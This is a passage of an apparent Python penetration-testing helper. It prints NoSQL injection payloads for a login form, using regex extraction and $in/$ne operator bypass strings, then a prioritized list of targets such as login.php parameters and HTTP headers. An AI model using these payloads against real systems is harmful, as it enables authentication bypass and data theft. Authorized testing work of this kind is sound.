print()
print("  4. Regex-based extraction:")
print("     username[$eq]=admin&password[$regex]=^a.*")
print()
print("  5. Array-based injection:")
print("     username[$in][]=admin&username[$in][]=root&password[$ne]=x")
print()

# Summary
print("[+] TEST SUMMARY")
print("=" * 80)
print()
print("HIGH-PRIORITY TEST TARGETS:")
print("  1. login.php POST parameters (username, password)")
print("     → SQLi: Boolean, Union, Time-based")
print("     → NoSQLi: Operator injection, JSON body")
print()
print("MEDIUM-PRIORITY TEST TARGETS:")
print("  2. HTTP Headers (Cookie, User-Agent, Referer, X-Forwarded-For)")
